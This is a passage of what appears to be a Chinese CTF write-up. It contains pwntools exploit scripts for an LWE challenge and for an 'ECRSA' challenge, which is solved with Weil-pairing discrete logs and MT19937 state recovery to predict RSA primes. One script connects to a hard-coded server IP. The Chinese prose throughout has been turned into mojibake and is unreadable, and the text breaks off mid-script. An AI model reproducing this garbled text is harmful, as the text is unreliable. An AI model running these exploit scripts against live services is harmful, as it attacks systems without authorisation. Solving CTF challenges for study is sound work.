coord_samples: list of integers in 0..p-1 (may contain duplicates)    if not coord_samples:        return 0    # work with raw samples but compute unique sorted list for gap detection    uniq = sorted(set(coord_samples))    if len(uniq) == 1:        return uniq[0]    # find largest gap in circular sorted list    max_gap = -1    max_idx = -1    for i in range(len(uniq)-1):        gap = uniq[i+1] - uniq[i]        if gap &gt; max_gap:            max_gap = gap; max_idx = i    # wrap gap    wrap_gap = (uniq[0] + p) - uniq[-1]    if wrap_gap &gt; max_gap:        max_gap = wrap_gap        max_idx = len(uniq)-1    # cluster is the sequence after the largest gap    start = (max_idx + 1) % len(uniq)    cluster_vals = []    i = start    while True:        cluster_vals.append(uniq[i])        i = (i+1) % len(uniq)        if i == start:            break    arc_min = cluster_vals[0]    arc_max = cluster_vals[-1]    # map each original sample into integer rep inside arc by shifting by k*p    lifted = []    # choose center of arc for closeness    arc_center = (arc_min + ((arc_max - arc_min) // 2)) % p    for v in coord_samples:        # try shifts -1,0,1        choices = [v, v + p, v - p]        # pick representative closest to arc_center (in integer line)        best = min(choices, key=lambda x: abs(x - arc_center))        lifted.append(best)    # compute median of lifted values for robustness    lifted.sort()    L = len(lifted)    if L % 2 == 1:        est = lifted[L//2]    else:        est = (lifted[L//2 - 1] + lifted[L//2]) // 2    return int(est % p)# ---------------- reproduce A from Public Seed ----------------def reproduce_A(seedA):    rng = random.Random()    rng.seed(seedA)    while True:        A = [[rng.randint(0,99) for _ in range(n)] for __ in range(n)]        # quick check: try to invert mod p        try:            _ = mat_mod_inv(A, p)            return A        except Exception:            # not invertible, continue            continue# ---------------- parse a python-style list from remote output ----------------def extract_list_from_bytes(b):    # try to find the first [...] substring and parse    m = re.search(rb&#x27;\\[[\\s\\S]*?\\]&#x27;, b)    if not m:        return None    s = m.group(0).decode()    try:        L = ast.literal_eval(s)        return [int(x) % p for x in L]    except Exception:        return None# ---------------- main exploit ----------------def main():    if len(sys.argv) != 2:        print(&quot;Usage: python3 exploit_pwntools_lwe.py HOST PORT&quot;)        return    host = sys.argv[1]    port = int(sys.argv[2])    print(f&quot;Connecting to &#123;host&#125;:&#123;port&#125; ...&quot;)    r = remote(host, port, timeout=10)    seedA = r.recvline().split(b&#x27;:&#x27;)[-1].strip()    print(&quot;Reproducing A from Public Seed... (may take a moment)&quot;)    A = reproduce_A(seedA)    print(&quot;A reproduced. Inverting A mod p...&quot;)    Ainv = mat_mod_inv(A, p)    print(&quot;A inverse computed.&quot;)    samples = []    for i in range(QUERIES):        # wait for prompt; be resilient        try:            r.recvuntil(b&#x27;Give me your choice&gt;&#x27;, timeout=5)        except Exception:            # maybe prompt not exactly matching; continue anyway            pass        r.sendline(b&#x27;1&#x27;)        # read until we can extract a list        data = b&#x27;&#x27;        got = None        for _ in range(10):            try:                chunk = r.recvuntil(b&#x27;]&#x27;, timeout=3)            except Exception:                try:                    chunk = r.recv(timeout=3)                except Exception:                    chunk = b&#x27;&#x27;            data += chunk            got = extract_list_from_bytes(data)            if got is not None:                break        if got is None:            print(f&quot;Failed to parse sample &#123;i&#125;&quot;)            return        if len(got) != n:            print(f&quot;Sample length unexpected: &#123;len(got)&#125;&quot;)            return        samples.append(got)        if (i+1) % 20 == 0:            print(f&quot;Collected &#123;i+1&#125;/&#123;QUERIES&#125; samples&quot;)    print(&quot;Collected samples, estimating b per-coordinate...&quot;)    coord_samples = [ [] for _ in range(n) ]    for s in samples:        for i, val in enumerate(s):            coord_samples[i].append(val)    b_est = [ estimate_b_from_samples(coord_samples[i], p) for i in range(n) ]    print(&quot;Estimated b vector.&quot;)    print(&quot;Computing s = A^&#123;-1&#125; * b (mod p) ...&quot;)    s_est = mat_vec_mul(Ainv, b_est, p)    # decode flag chars    chars = []    for v in s_est:        cval = v % 200        try:            chars.append(chr(cval))        except Exception:            chars.append(&#x27;?&#x27;)    flag = &#x27;&#x27;.join(chars)    print(&quot;Recovered (first n) chars:&quot;)    print(flag)    r.close()if __name__ == &#x27;__main__&#x27;:    main()\n07-ECRSAç©ä¸ŠRSAæ‚äº¤ç‰ˆäº†ï¼ˆç¬‘ï¼‰\nfrom Crypto.Util.number import *import osfrom sage.all import *import random as random2BANNER=&quot;&quot;&quot; ######  ##     ##  ######   ######  ######## ########     #######    #####    #######  ######## ##    ## ##     ## ##    ## ##    ##    ##    ##          ##     ##  ##   ##  ##     ## ##       ##       ##     ## ##       ##          ##    ##                 ## ##     ##        ## ##        ######  ##     ##  ######  ##          ##    ######       #######  ##     ##  #######  #######        ## ##     ##       ## ##          ##    ##          ##        ##     ## ##              ## ##    ## ##     ## ##    ## ##    ##    ##    ##          ##         ##   ##  ##        ##    ##  ######   #######   ######   ######     ##    ##          #########   #####   #########  ######  ######  ########  ##    ## ########  ########  #######     ######## ##    ## ##     ##  ##  ##  ##     ##    ##    ##     ##    ##    ## ##       ##     ##   ####   ##     ##    ##    ##     ##        ##   ##       ########     ##    ########     ##    ##     ##       ##    ##       ##   ##      ##    ##           ##    ##     ##      ##     ##    ## ##    ##     ##    ##           ##    ##     ##      ##      ######  ##     ##    ##    ##           ##     #######       ##     &quot;&quot;&quot;print(BANNER)globalPrime=26959946667150639794667015087019630673637144422540572481103610249153def GetFlag():    flag=os.getenv(&#x27;GZCTF_FLAG&#x27;).encode()    upperBoundPrime=2**1280-2**512+2**128-2**40-2**16-8+1    p=previous_prime(random2.randint(0,upperBoundPrime))    q=next_prime(random2.randint(0,upperBoundPrime))    e=1435756429    n=p*q    c=pow(bytes_to_long(flag),e,n)    print(f&#x27;N=&#123;n&#125;&#x27;)    print(f&#x27;e=&#123;e&#125;&#x27;)    print(f&#x27;c=&#123;c&#125;&#x27;)    print(f&#x27;hint=&#123;q&gt;&gt;960&#125;&#x27;)def Chall():    p=int(input(&#x27;Give me your prime&gt;&#x27;))    if(p.bit_length()&lt;226 or p.bit_length()&gt;333 or not isPrime(p)):        print(&#x27;Invaid prime!&#x27;)        exit(1)    a,b=[int(i)%p for i in input(&#x27;Give me your parameters&gt;&#x27;).split()]    assert a**2+b**2    v=2    while(pow(v,p&gt;&gt;1,p)==1):        v+=1    Fq2=GF((p,2),modulus=[-v,0,1],name=&#x27;sqv&#x27;)    E=EllipticCurve(Fq2,[a,b])    x1,x2=[Zmod(p)(i) for i in input(&#x27;Give me 2 base points(x_coordinate)&gt;&#x27;).split()]    G1=E.lift_x(x1)    G2=E.lift_x(x2)    assert G1.order()==G2.order()    orderG=G1.order()    def ListG(Gx):        Gxy=Gx.xy()        r=[]        r=list(Gxy[0])+list(Gxy[1])        return tuple(r)    print(f&#x27;Your Point G1: &#123;ListG(G1)&#125;&#x27;)    print(f&#x27;Your Point G2: &#123;ListG(G2)&#125;&#x27;)    for i in range(44):        u,v=random2.randint(0,globalPrime),random2.randint(0,globalPrime)        print(f&#x27;Your Point:&#123;ListG(u*G1+v*G2)&#125;&#x27;)        u1,v1=[int(i) for i in input(&#x27;Give me your answer Result&gt;&#x27;).split()]        assert u1==u and v1==vfor _ in range(2):    op=int(input(&#x27;Give me your option&gt;&#x27;))    if(op==1):        GetFlag()    elif(op==2):        Chall()    else:        exit(0)\næˆ‘ä»¬ä¸€å…±åªæœ‰ä¸¤æ¬¡äº¤äº’æœºä¼šï¼Œé€‰ä¸¤æ¬¡1ä¹Ÿæ²¡æœ‰åŠæ³•æ”»ç ´RSAï¼Œæ¨¡æ•°å®Œå…¨ä¸ä¸€æ ·ï¼Œå› æ­¤å¿…é¡»æ˜¯ä¸€ä¸ª1ä¸€ä¸ª2ã€‚è™½ç„¶2çœ‹èµ·æ¥å…¶å®æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œflagä¿¡æ¯å…¨åœ¨1çš„åŠ å¯†ä¸­ï¼Œä½†æ˜¯ç»™å‡ºçš„hintå¤ªå°‘äº†ï¼Œpå’Œqéƒ½æ˜¯çº¦1280ä½è´¨æ•°ï¼Œä½†ä»…ç»™å‡ºäº†qçš„é«˜1280-960=320ä½ï¼Œä¸è¶³ä»¥ä½¿ç”¨coppersmithæ–¹æ³•ï¼ˆè‡³å°‘è¦qçš„ä¸€åŠé«˜ä½ï¼‰ï¼Œè¿˜å·®320ä½ä¹Ÿè¿œè¿œè¶…è¿‡å¯ä»¥çˆ†ç ´çš„èŒƒå›´ï¼Œçœ‹æ¥æˆ‘ä»¬è¿˜æ˜¯å¾—åˆ©ç”¨2ã€‚\n2ä¸1çš„å…±é€šç‚¹åªæœ‰ä½¿ç”¨äº†randomåº“ç”Ÿæˆçš„éšæœºæ•°ï¼Œçœ‹æ¥åªèƒ½ä»è¿™é‡Œå…¥æ‰‹ï¼Œpythonçš„randomåº“ä½¿ç”¨äº†mt19937ç”Ÿæˆä¼ªéšæœºæ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ”¶é›†è¿ç»­çš„ä¸€äº›ç”Ÿæˆå€¼ï¼Œè¿˜åŸæ•´ä¸ªéšæœºæ•°å‘ç”Ÿå™¨ï¼Œè¿™æ ·å°±å¯ä»¥å¾—åˆ°ä»»ä½•éšæœºæ•°äº†ã€‚æƒ³è¦å¤åŸmt19937ï¼Œæˆ‘ä»¬éœ€è¦624ä¸ª32ä½æ•´æ•°ï¼ˆçŠ¶æ€ï¼‰ã€‚\nå€ŸåŠ©ChatGPTæƒŠäººçš„æ³¨æ„åŠ›ï¼ŒglobalPrime=26959946667150639794667015087019630673637144422540572481103610249153å®é™…ä¸Šæ˜¯$2^{224}-63$ï¼Œå› æ­¤random.randintåŸºæœ¬ä¸Šè¿”å›ä¸€ä¸ª224bitçš„å€¼ï¼Œä¹Ÿå°±æ˜¯7ä¸ª32bitæ•°ã€‚å®ŒæˆæŒ‘æˆ˜ä¸€å…±æ˜¯44ç»„ï¼Œæ¯ç»„ä¸¤ä¸ªæ•°ï¼Œå…±88ä¸ª224bitæ•°ï¼Œä¹Ÿå°±æ˜¯$88\\times7=616$ä¸ª32bitæ•°ï¼Œè·ç¦»æˆ‘ä»¬çš„624è¿˜å·®256bitï¼Œè¿™éƒ¨åˆ†ä¾é hintã€‚\nç”±äºæˆ‘ä»¬éœ€è¦è¿ç»­çš„éšæœºæ•°ï¼Œå¦‚æœå…ˆGetFlagå†Challï¼Œé‚£ä¹ˆå‰©ä¸‹è¿™256bitå°±æ˜¯qçš„ä½ä½ï¼Œè€Œä½ä½æˆ‘ä»¬ä¸å¥½æ‰¾ï¼Œäºæ˜¯å…ˆChallå†GetFlagï¼Œè¿™æ ·æˆ‘ä»¬åªéœ€è¦å¾—åˆ°pçš„é«˜256bitå°±èƒ½æ”»ç ´éšæœºæ•°ç”Ÿæˆå™¨äº†ã€‚\né¢˜ç›®ç»™å‡ºäº†qçš„é«˜320ä½ï¼Œç”±äºqå’Œrandomç”Ÿæˆçš„éšæœºæ•°ç›¸å·®ä¸å¤§ï¼Œé«˜320ä½å¯ä»¥è®¤ä¸ºå°±æ˜¯åŸå§‹çš„éšæœºæ•°ï¼Œç”±$n=pq$å¯ä»¥å¾—åˆ°pçš„é«˜ä½ï¼Œè™½ç„¶ç”±äºè¿›ä½ç­‰åŸå› ï¼Œå¯ä¿¡çš„ä½æ•°ä¸è¶³320ä½ï¼Œä½†256ä½è¿˜æ˜¯ç»°ç»°æœ‰ä½™ã€‚è¿™æ ·æˆ‘ä»¬å°±è¿˜åŸäº†éšæœºæ•°å‘ç”Ÿå™¨ï¼Œå¯ä»¥è‡ªå·±ç”Ÿæˆpå’Œqäº†ã€‚\né‚£ä¹ˆï¼Œæ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯ChallæŒ‘æˆ˜ã€‚æˆ‘ä»¬å¯ä»¥è‡ªé€‰226åˆ°333ä½çš„è´¨æ•°$p$ï¼Œå¹¶è‡ªé€‰åœ†é”¥æ›²çº¿çš„å‚æ•°$a$å’Œ$b$ï¼Œåœ¨æ¨¡$p^2$çš„ç¾¤ä¸‹æ„å»ºæ¤­åœ†æ›²çº¿$y^2=x^3+ax+b$ï¼Œå†è‡ªé€‰ä¸¤ä¸ªé˜¶ç›¸åŒçš„åŸºç‚¹ï¼Œå¼€å§‹æŒ‘æˆ˜ã€‚ä¼Ÿå¤§çš„Geminiå‘Šè¯‰æˆ‘åº”è¯¥é‡‡ç”¨é…å¯¹æ”»å‡»ï¼Œé€‰æ‹©è¶…å¥‡å¼‚æ›²çº¿$y^2=x^3+x$ï¼Œå†é€‰ä¸¤ä¸ªçº¿æ€§æ— å…³çš„ç‚¹ï¼Œåˆ©ç”¨Weil-Pairingçš„åŒçº¿æ€§æ€§è´¨ã€‚\næˆ‘ä»¬å·²çŸ¥$P=uG_1+vG_2$ï¼Œä¸”$G_1ï¼ŒG_2$é˜¶ç›¸åŒï¼Œéœ€è¦æ±‚å‡º$u,v$ï¼Œå¯¹$P$å’Œ$G_1$åšé…å¯¹ï¼Œ$e(P,G_1)=e(uG_1+vG_2,G_1)=e(G_1,G_1)^u\\cdot e(G_2,G_1)^v=e(G_2,G_1)^v$ã€‚\nå…¶ä¸­æ‰€æœ‰çš„ç‚¹æˆ‘ä»¬éƒ½å·²çŸ¥ï¼Œå› æ­¤å¯ä»¥è®¡ç®—å‡º$e(P,G_1)$å’Œ$e(G_2,G_1)$ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ç¦»æ•£å¯¹æ•°é—®é¢˜ï¼Œè§£å‡ºå®ƒå°±èƒ½æ±‚è§£$v$ã€‚å¯¹äºuï¼Œæˆ‘ä»¬å°†$P$å’Œ$G_2$é…å¯¹ï¼Œæ–¹æ³•ä¸€è‡´ã€‚è¿™æ ·æˆ‘ä»¬å°±æœ‰äº†ä¸¤ä¸ªç¦»æ•£å¯¹æ•°ï¼Œå…¶ä¸­é˜¶ä¸º$p+1$ï¼Œæˆ‘ä»¬åªéœ€è¦è®©$p+1$å¯ä»¥åˆ†è§£ä¸ºåªæœ‰å°ç´ æ•°å³å¯ã€‚æˆ‘åŸå…ˆä½¿ç”¨çš„ä»£ç é•¿è¿™æ ·ï¼š\nfrom functools import reducefrom Crypto.Util.number import getPrime, isPrimewhile True:    p = reduce(lambda x,y: x*y, [getPrime(10) for _ in range(25)])*4 - 1    if(p%4 == 3 and isPrime(p)):        print(p)        break#p=5143204670319561596213349668594160691006857613681759905713565676116637627\nåæ¥è·Ÿåˆ«çš„å¸ˆå‚…ä¸€äº¤æµï¼Œ10ä½çš„è´¨æ•°è¿˜æ˜¯å¤ªå¤§äº†ï¼Œå¤§å®¶éƒ½æ˜¯ç”¨2çš„è‹¥å¹²æ¬¡æ–¹ä¹˜3çš„è‹¥å¹²æ¬¡æ–¹å‡1ã€‚åˆå­¦åˆ°ä¸€æ‹›ã€‚\nå¦ä¸€ä¸ªé—®é¢˜æ˜¯æˆ‘æ€ä¹ˆæ‰¾ä¸¤ä¸ªxï¼Œè®©ä»–ä»¬çš„é˜¶ä¸€æ ·ï¼Œä¸”ä¸æ˜¯çº¿æ€§ç›¸å…³ã€‚äºæ˜¯æˆ‘æ‹œæ‰˜Geminiå†™äº†å¦ä¸€ä»½è„šæœ¬ã€‚\nfrom sage.all import *import randomimport time# ================== è¯·åœ¨è¿™é‡Œæ›¿æ¢æˆé¢˜ç›®ç»™çš„ p, a, b ==================p = 5143204670319561596213349668594160691006857613681759905713565676116637627a = 1b = 0# =================================================================# æœç´¢å‚æ•°ï¼ˆå¯è°ƒæ•´ï¼‰MAX_TRIALS = 3000      # æœ€å¤šå°è¯•å¤šå°‘ä¸ª xUSE_RANDOM = False      # True: éšæœºé‡‡æ · xï¼›False: é¡ºåºä» 2 å¼€å§‹VERBOSE = Truedef info(*args, **kwargs):    if VERBOSE:        print(*args, **kwargs)# æ‰¾ä¸€ä¸ªäºŒæ¬¡éå‰©ä½™ vï¼ˆä¸æœåŠ¡å™¨ä¸€è‡´çš„å¯»æ‰¾æ–¹æ³•ï¼‰v_val = 2while pow(v_val, (p - 1) // 2, p) == 1:    v_val += 1info(&quot;[info] chosen v =&quot;, v_val, &quot;p bitlen =&quot;, p.bit_length())# æ„é€  F_p^2 ä¸æ›²çº¿Fp2 = GF((p,2), name=&#x27;z&#x27;, modulus=[-v_val,0,1])z = Fp2.gen()E = EllipticCurve(Fp2, [a, b])info(&quot;[info] Elliptic curve constructed.&quot;)# ç”¨æ¥ä¿å­˜åŒé˜¶çš„ç‚¹: dict: order -&gt; list of (x_int, Point)same_order = &#123;&#125;tried = set()start = time.time()trials = 0while trials &lt; MAX_TRIALS:    trials += 1    x_int = trials + 2    tried.add(x_int)    # æŠŠ x æ”¾å…¥ Fp2ï¼ˆä½œä¸ºåŸºåŸŸå…ƒç´ åµŒå…¥ï¼‰    x_fp2 = Fp2(x_int)    # å°è¯• lift_x    try:        G = E.lift_x(x_fp2)    except Exception as e:        # x ä¸èƒ½è¢« liftï¼ˆæ²¡æœ‰å¯¹åº”çš„ yï¼‰ï¼Œè·³è¿‡        if VERBOSE:            print(f&quot;[trial &#123;trials&#125;] x=&#123;x_int&#125; : lift_x failed (&#123;e&#125;)&quot;)        continue    # æ£€æŸ¥æ˜¯å¦ä¸ºæ— ç©·è¿œæˆ–å•ä½ç‚¹    if G.is_zero():        if VERBOSE:            print(f&quot;[trial &#123;trials&#125;] x=&#123;x_int&#125; : point is zero&quot;)        continue    # è®¡ç®—é˜¶    try:        ordG = Integer(G.order())    except Exception as e:        print(f&quot;[trial &#123;trials&#125;] x=&#123;x_int&#125; : computing order failed: &#123;e&#125;&quot;)        continue    if ordG &lt;= 1:        if VERBOSE:            print(f&quot;[trial &#123;trials&#125;] x=&#123;x_int&#125; : trivial order &#123;ordG&#125;, skip&quot;)        continue    info(f&quot;[trial &#123;trials&#125;] x=&#123;x_int&#125; -&gt; order = &#123;ordG&#125;&quot;)    # å­˜å…¥å­—å…¸    lst = same_order.get(ordG, [])    lst.append((x_int, G))    same_order[ordG] = lst    # å¦‚æœæœ‰è‡³å°‘ä¸¤ç‚¹ï¼Œæ£€æŸ¥é…å¯¹æ˜¯å¦éå¹³å‡¡    if len(same_order[ordG]) &gt;= 2:        # éå†è¯¥é˜¶ä¸‹çš„æ‰€æœ‰ç‚¹å¯¹        for i in range(len(same_order[ordG])):            for j in range(i+1, len(same_order[ordG])):                x1, G1 = same_order[ordG][i]                x2, G2 = same_order[ordG][j]                # è®¡ç®— Weil pairing (ç”¨è¯¥é˜¶ ordG)                try:                    e21 = G2.weil_pairing(G1, ordG)                except Exception as e:                    print(f&quot;[trial &#123;trials&#125;] pairing failed for ord &#123;ordG&#125;: &#123;e&#125;&quot;)                    continue                info(f&quot;  testing pair x1=&#123;x1&#125;, x2=&#123;x2&#125;, e(G2,G1)=&#123;e21&#125;&quot;)                if e21 != 1:                    elapsed = time.time() - start                    print(&quot;=== FOUND ===&quot;)                    print(&quot;x1 =&quot;, x1)                    print(&quot;x2 =&quot;, x2)                    print(&quot;order =&quot;, ordG)                    print(&quot;e(G2,G1) =&quot;, e21)                    print(f&quot;trials = &#123;trials&#125;, elapsed = &#123;elapsed:.2f&#125;s&quot;)                    raise SystemExit(0)&#x27;&#x27;&#x27;=== FOUND ===x1 = 3x2 = 4order = 1285801167579890399053337417148540172751714403420439976428391419029159407e(G2,G1) = 1147091865358558230580726329472507206030651293267131266460286299834598687*z + 3208661019248159787151861860459623458845339463259508253495498454434988461trials = 2, elapsed = 0.34s&#x27;&#x27;&#x27;\nå¾ˆå¹¸è¿åœ¨æˆ‘æ‰¾çš„pä¸‹ï¼Œx=3å’Œ4å°±æ˜¯ä¸€ç»„åŒé˜¶ä¸”ä¸çº¿æ€§ç›¸å…³çš„ç‚¹å¯¹ï¼Œäºæ˜¯æœ€åçš„äº¤äº’ä»£ç å¦‚ä¸‹ã€‚\nfrom sage.all import *from pwn import *import reimport sysr = remote(&#x27;106.14.191.23&#x27;, 56876)def recv_ints_from_line(byte_pat):    line = r.recvline_contains(byte_pat).decode().strip()    nums = re.findall(r&#x27;-?\\d+&#x27;, line)    return [int(x) for x in nums]def send_and_recv_prompt(prompt, data):    r.sendlineafter(prompt, data)def reconstruct_fp2_element(Fp2, coeffs):    # coeffs: [c0, c1]  (c0 + c1 * gen)    return Fp2(int(coeffs[0])) + Fp2.gen() * Fp2(int(coeffs[1]))def solve_chall():    uv = []    p = 5143204670319561596213349668594160691006857613681759905713565676116637627    # send parameters a b    a = 1    b = 0    # choose two x coords    x1 = 3    x2 = 4    log.info(&quot;Choosing option 2: Chall&quot;)    r.sendlineafter(b&#x27;Give me your option&gt;&#x27;, b&#x27;2&#x27;)    log.info(f&quot;Sending prime p = &#123;p&#125;&quot;)    r.sendlineafter(b&#x27;Give me your prime&gt;&#x27;, str(p).encode())    log.info(f&quot;Sending parameters a=&#123;a&#125;, b=&#123;b&#125;&quot;)    r.sendlineafter(b&#x27;Give me your parameters&gt;&#x27;, f&#x27;&#123;a&#125; &#123;b&#125;&#x27;.encode())    log.info(f&quot;Sending base points x1=&#123;x1&#125;, x2=&#123;x2&#125;&quot;)    r.sendlineafter(b&#x27;Give me 2 base points(x_coordinate)&gt;&#x27;, f&#x27;&#123;x1&#125; &#123;x2&#125;&#x27;.encode())    # === æ¥æ”¶å¹¶è§£ææœåŠ¡å™¨è¿”å›çš„åŸºç‚¹ ===    line_g1 = r.recvline_contains(b&#x27;Your Point G1:&#x27;).decode()    G1_coords_str = line_g1.split(&#x27;:&#x27;, 1)[1].strip()    line_g2 = r.recvline_contains(b&#x27;Your Point G2:&#x27;).decode()    G2_coords_str = line_g2.split(&#x27;:&#x27;, 1)[1].strip()        G1_nums = [int(i) for i in G1_coords_str.strip()[1:-1].split(&#x27;, &#x27;)]    G2_nums= [int(i) for i in G2_coords_str.strip()[1:-1].split(&#x27;, &#x27;)]    # reconstruct Fp2 and curve    # find same v as server (smallest v with Legendre symbol -1)    v_server = 2    while pow(v_server, (p - 1) // 2, p) == 1:        v_server += 1    Fp2 = GF((p,2), name=&#x27;z&#x27;, modulus=[-v_server, 0, 1])    E = EllipticCurve(Fp2, [a, b])    # reconstruct G1, G2    g1x = reconstruct_fp2_element(Fp2, [G1_nums[0], G1_nums[1]])    g1y = reconstruct_fp2_element(Fp2, [G1_nums[2], G1_nums[3]])    G1 = E(g1x, g1y)    g2x = reconstruct_fp2_element(Fp2, [G2_nums[0], G2_nums[1]])    g2y = reconstruct_fp2_element(Fp2, [G2_nums[2], G2_nums[3]])    G2 = E(g2x, g2y)    orderG = Integer(G1.order())    log.info(f&quot;Order of G: &#123;orderG&#125;&quot;)    # precompute pairings of base points if needed    base_e21 = G2.weil_pairing(G1, orderG)  # e(G2, G1)    base_e12 = G1.weil_pairing(G2, orderG)  # e(G1, G2) (should be inverse if skew-symmetric)    # 44 rounds    for i in range(44):        P_nums = recv_ints_from_line(b&#x27;Your Point:&#x27;)        if len(P_nums) &lt; 4:            print(&quot;Can&#x27;t parse P&quot;)            return        px = reconstruct_fp2_element(Fp2, [P_nums[0], P_nums[1]])        py = reconstruct_fp2_element(Fp2, [P_nums[2], P_nums[3]])        P = E(px, py)        # compute pairings        alpha = P.weil_pairing(G1, orderG)   # = e(P, G1) = e(G2,G1)^v        beta  = base_e21                     # = e(G2,G1)        gamma = P.weil_pairing(G2, orderG)   # = e(P,G2) = e(G1,G2)^u        delta = base_e12                     # = e(G1,G2)        v_sol = discrete_log(alpha, beta, ord=orderG)        u_sol = discrete_log(gamma, delta, ord=orderG)        r.sendlineafter(b&#x27;Give me your answer Result&gt;&#x27;, f&#x27;&#123;int(u_sol)&#125; &#123;int(v_sol)&#125;&#x27;.encode())        uv.append(u_sol)        uv.append(v_sol)    print(&quot;Done&quot;)    print(uv)    r.interactive()if __name__ == &#x27;__main__&#x27;:    solve_chall()\nè¿™æ ·å°±å¾—åˆ°äº†æ‰€æœ‰çš„uå’Œvï¼Œå®ƒä»¬ç»„æˆäº†ä¸€ä¸ªåˆ—è¡¨ã€‚è€Œåœ¨r.interactive()ä¹‹åï¼Œè¿˜éœ€è¦è¾“å…¥1è·å–nï¼Œeï¼Œcå’Œhintã€‚\nç¡®å®špçš„é«˜ä½çš„æ–¹æ³•æ˜¯ï¼šå°†hintåé¢è¡¥960ä¸ª0ï¼Œå’Œhintåé¢è¡¥960ä¸ª1ï¼Œåˆ†åˆ«ç”¨nå»é™¤å®ƒï¼Œä¼šå¾—åˆ°pçš„ä¸Šç•Œå’Œä¸‹ç•Œï¼Œé«˜ä½çš„å…±é€šéƒ¨åˆ†çº¦ä¸º300ä½ï¼Œå–æœ€é«˜çš„256ä½ã€‚\n# å°†ä¸‹é¢çš„ N_str ä¸ qh_str æ›¿æ¢ä¸ºç»™å®šçš„å­—ç¬¦ä¸²N_str = &quot;106897429131436433939432912232276233296311876951532001123022382654864722947479670691716832533065551314863759684315253251060657681449987001046824319332752747575149259813569751774809904578140218190142084770417026385676156279911248125384075166924986815698053727836585266634861036806610757625661750087036487582812084202599896118909344304202288362656690252059501639547661050581185671640360702353386468101709512990874181857424903319023494387842239621022113621194024582236546465182006221753466985945737370226613429335307234674303583652412436928398230621279142253903936164694090000099046583773588189519968922110944689888964198066676720598220406318844002758600075929920216302483852562277187528679602845952613336071175591330954339185879800089600441519691730600437881852821751423549&quot;qh_str = &quot;727261448275186783330537485153166497571240820998172969989601692945381865374269973262457015915319&quot;N = int(N_str)qh = int(qh_str)Q = qh &lt;&lt; 960p_min = N // (Q + (1 &lt;&lt; 960) - 1)p_max = N // Q# è®¡ç®—å…±åŒæœ€é«˜ä½æ•°x = p_min ^ p_maxcommon_prefix_bits = p_max.bit_length() - x.bit_length()# å–å‡ºæœ€é«˜ 320 ä½ä¸æœ€é«˜ 256 ä½ï¼ˆä½œä¸ºæ•´æ•°ï¼‰bitlen = p_max.bit_length()   # åº”è¯¥ä¸º 1280p_top320 = p_max &gt;&gt; (bitlen - 320)p_top256 = p_max &gt;&gt; (bitlen - 256)print(&quot;common_prefix_bits =&quot;, common_prefix_bits)print(&quot;p_top320 =&quot;, p_top320)print(&quot;p_top256 =&quot;, p_top256)#å®é™…ä¸Šå…±åŒçš„ä½æ•°æœ‰316ä½ï¼Œå–å‡º256ä½åä¸º83900644468400484600848154534507404984521324413319865465147839187423941603919\nå› æ­¤æˆ‘ä»¬æœ‰äº†mt19937æ•´ä¸ªçŠ¶æ€ï¼Œç”¨randcrackå°±å¯ä»¥è¿˜åŸã€‚åœ¨è¶Šè¿‡1280-256ä½çš„påï¼Œæˆ‘ä»¬å¾—åˆ°äº†1280ä½çš„qã€‚\nimport randcrackfrom gmpy2 import next_primeuvlist = [â€¦]# æœ€åçš„256ä½æ•°å­—extra_256bit_num = 83900644468400484600848154534507404984521324413319865465147839187423941603919def submit_large_number(cracker, large_num, total_bits):    &quot;&quot;&quot;    å°†ä¸€ä¸ªå¤§æ•´æ•°æ‹†åˆ†æˆå¤šä¸ª32ä½å—ï¼Œå¹¶æŒ‰æ­£ç¡®çš„é¡ºåºæäº¤ç»™crackerã€‚    :param cracker: randcrack.RandCrack å®ä¾‹    :param large_num: è¦æ‹†åˆ†çš„å¤§æ•´æ•°    :param total_bits: å¤§æ•´æ•°çš„æ€»ä½æ•° (å¿…é¡»æ˜¯32çš„å€æ•°)    &quot;&quot;&quot;    if total_bits % 32 != 0:        raise ValueError(&quot;æ€»ä½æ•°å¿…é¡»æ˜¯32çš„å€æ•°&quot;)    num_chunks = total_bits // 32    # ä»ä½ä½åˆ°é«˜ä½ä¾æ¬¡æå–32ä½å—    # è¿™å¯¹åº”äº† getrandbits çš„æ‹¼æ¥é¡ºåº    for i in range(num_chunks):        # é€šè¿‡å³ç§»å’Œæ©ç æ“ä½œæå–ç¬¬ i ä¸ª32ä½å—        chunk = (large_num &gt;&gt; (i * 32)) &amp; 0xFFFFFFFF        cracker.submit(chunk)# --- ä¸»æ‰§è¡Œé€»è¾‘ ---if len(uvlist) != 88:    print(f&quot;é”™è¯¯ï¼šuvlist åº”è¯¥åŒ…å«88ä¸ªæ•°å­—ï¼Œä½†å®é™…æœ‰ &#123;len(uvlist)&#125; ä¸ªã€‚&quot;)else:    # 1. åˆå§‹åŒ– RandCrack    cracker = randcrack.RandCrack()    print(&quot;RandCrackå®ä¾‹å·²åˆ›å»ºã€‚å¼€å§‹æäº¤æ•°æ®...&quot;)    # 2. æŒ‰é¡ºåºå¤„ç† uvlist ä¸­çš„88ä¸ª224ä½æ•°    print(f&quot;æ­£åœ¨å¤„ç† &#123;len(uvlist)&#125; ä¸ª224ä½æ•°...&quot;)    for i, num in enumerate(uvlist):        submit_large_number(cracker, num, 224)    print(&quot;æ‰€æœ‰224ä½æ•°æäº¤å®Œæ¯•ã€‚&quot;)    # 3. å¤„ç†æœ€åçš„256ä½æ•°    print(&quot;æ­£åœ¨å¤„ç†æœ€åçš„256ä½æ•°...&quot;)    submit_large_number(cracker, extra_256bit_num, 256)    print(&quot;256ä½æ•°æäº¤å®Œæ¯•ã€‚&quot;)    print(&quot;\\n========================================================&quot;)    print(&quot;ğŸ‰ æˆåŠŸï¼æ‰€æœ‰æ•°æ®å·²æŒ‰æ­£ç¡®é¡ºåºæäº¤ã€‚&quot;)    print(&quot;cracker å®ä¾‹ç°åœ¨å·²ä¸æœåŠ¡å™¨çš„PRNGçŠ¶æ€åŒæ­¥ã€‚&quot;)    print(&quot;========================================================&quot;)    # 4. ç°åœ¨ä½ å¯ä»¥ç”¨å®ƒæ¥é¢„æµ‹äº†    # ä¾‹å¦‚ï¼Œåœ¨è¶Šè¿‡å‰©ä½™çš„pä¹‹åï¼Œé¢„æµ‹getFlagéƒ¨åˆ†ç”Ÿæˆçš„ç¬¬ä¸€ä¸ª1280ä½çš„éšæœºæ•°(q)    total_bits_to_predict = 1280-256    num_chunks_to_predict = total_bits_to_predict // 32    predicted_large_num = 0    for i in 